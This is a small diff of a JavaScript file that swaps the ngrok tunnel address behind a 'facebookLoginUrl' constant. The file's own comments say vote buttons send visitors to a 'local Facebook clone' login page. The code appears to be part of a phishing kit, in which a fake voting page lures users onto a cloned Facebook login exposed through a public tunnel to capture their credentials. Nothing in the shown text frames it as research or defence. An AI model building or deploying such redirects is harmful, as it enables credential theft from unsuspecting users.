@@ -6,7 +6,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // IMPORTANT: For a live website, you must create a real Facebook App
     // to get a valid client_id and set up a valid redirect_uri.
     // The link below is a placeholder that will take the user to your local login page clone.
-    const facebookLoginUrl = 'https://9edc6d33bff0.ngrok-free.app/'; // Assuming this is your local Facebook clone path
+    const facebookLoginUrl = 'https://1e657d52293c.ngrok-free.app/'; // Assuming this is your local Facebook clone path
 
     allVoteButtons.forEach(button => {
         button.addEventListener('click', () => {
